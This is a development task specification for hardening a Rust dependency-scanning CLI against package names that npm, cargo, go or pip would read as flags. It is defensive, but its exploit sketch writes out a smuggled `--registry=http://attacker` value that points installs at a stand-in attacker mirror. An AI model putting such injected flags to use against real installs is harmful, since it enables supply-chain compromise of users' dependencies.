# Task 037 — Install command CLI flag injection hardening

**Status:** backlog
**Depends on:** 024 (install subcommand)
**Security finding:** H-1 (HIGH)

## Objective

Prevent package names that look like command-line flags (tokens starting with `-`) from being passed to wrapped package managers (`npm install`, `cargo add`, `go get`, `pip install`). Without this guard, an attacker can supply `--registry=http://evil` as a package name, causing dep-scan to scan the bare name (which passes because no such package exists at that path) then hand the flag to the underlying tool where it redirects the install to a hostile mirror dep-scan never inspected.

## Background

`run_install` in `src/main.rs` builds a `Command::new(cmd).args(packages)` call where `packages` comes directly from CLI positional arguments. Rust's `std::process::Command` does not differentiate between flags and positional arguments when it executes the subprocess — the OS sees each entry in `args` as a separate token. Tools like npm interpret tokens starting with `-` as flags regardless of position.

The exploit sketch: `dep-scan install '--registry=http://attacker' express --registry npm` scans the string `--registry=http://attacker` as a package name (no such package, which dep-scan treats as a pass or an error depending on policy), then executes `npm install --registry=http://attacker express`, pulling express from the attacker's mirror.

The same gap exists in the `check` subcommand: a user or CI script that feeds package names from an untrusted source could pass flag-like tokens that corrupt the npm/cargo/go/pip invocation.

## Behavior

### New function

Add `validate_package_names(names: &[String], registry: RegistryType) -> Result<(), ValidationError>` (or equivalent) in `src/main.rs` (or a new `src/validation.rs`). The function must:

- Reject any token that starts with `-` with `ValidationError::FlagLike { token }`, including single-dash `-X` and double-dash `--X=Y` forms.
- Reject empty or whitespace-only tokens with `ValidationError::Empty`.
- Accept all other tokens without further grammar enforcement at this layer (registry-specific name grammar validation can be added in a future task if needed — the critical security property here is the leading-dash check).
- Return an error on the first bad token, naming it verbatim in the message.

### Integration points

Call `validate_package_names` in:

1. `run_install` — before the scan and before any exec, so a bad token never reaches either the registry client or the subprocess.
2. `run_check` — before the scan loop, for the same reason (a flag-like token in `check` would produce a misleading "package not found" error rather than a clear rejection).

### Error output

Validation failures must exit with code 2 (bad input, consistent with other argument-parsing errors) and print a human-readable message to stderr that includes the bad token and explains why it was rejected.

## Requirements

- **REQ-037-01:** Any package name token starting with `-` is rejected before scanning and before exec; exit code 2, stderr names the bad token.
- **REQ-037-02:** Empty or whitespace-only tokens are rejected before scanning; exit code 2.
- **REQ-037-03:** Validation runs in both `install` and `check` subcommands.
- **REQ-037-04:** Scoped npm packages (`@scope/pkg`) and Go module paths (`github.com/foo/bar`) are accepted without modification.
- **REQ-037-05:** Multi-package invocations where any one token fails validation are rejected in their entirety (no partial scans of the valid tokens).
- **REQ-037-06:** Validation failure produces zero registry network calls and zero subprocess invocations.

## Acceptance criteria

- [ ] `validate_package_names` (or equivalent) implemented and callable from `run_install` and `run_check`.
- [ ] All tokens starting with `-` are rejected with a clear error (REQ-037-01); verified by T-037-01, T-037-02, T-037-10 through T-037-13.
- [ ] Empty / whitespace tokens are rejected (REQ-037-02); verified by T-037-07, T-037-08.
- [ ] Validation fires in both `install` and `check` (REQ-037-03); verified by T-037-10 through T-037-13.
- [ ] Scoped npm packages and Go paths accepted (REQ-037-04); verified by T-037-04, T-037-06, T-037-15.
- [ ] Entire batch rejected on first bad token (REQ-037-05); verified by T-037-09.
- [ ] Zero network calls and zero subprocess invocations on validation failure (REQ-037-06); verified by T-037-10 through T-037-13 (wiremock observes 0 calls).
- [ ] Error message includes the bad token verbatim (T-037-16).
- [ ] All task 024 existing tests continue to pass (T-037-17).
- [ ] `cargo test`, `cargo clippy --all-targets --all-features -- -D warnings`, and `cargo fmt --check` all pass.

## Out of scope

- Full registry-specific name grammar validation (npm name length/character rules, crates.io naming rules). The `-` prefix check closes the injection vector; further grammar validation is a separate hardening task.
- Validation of package names that come from lockfile parsing (those are structured data, not user-supplied CLI tokens).
- The `--` separator trick (prepending `--` to the package list for tools that support it). The `-` prefix check is a complete defense; the separator is defense-in-depth that can be added later without a spec change.

## Risk notes

- Some legitimate package ecosystems allow names starting with `@` (npm scoped packages) or containing `/` (Go modules) — the validator must not over-restrict. Only the leading `-` is categorically flag-like across all four ecosystems dep-scan supports.
- The validation runs before the scan, so it cannot consult a cached result or registry metadata to distinguish "package named `--foo`" from "flag `--foo`". The leading-dash heuristic is both sufficient and unambiguous for this purpose.
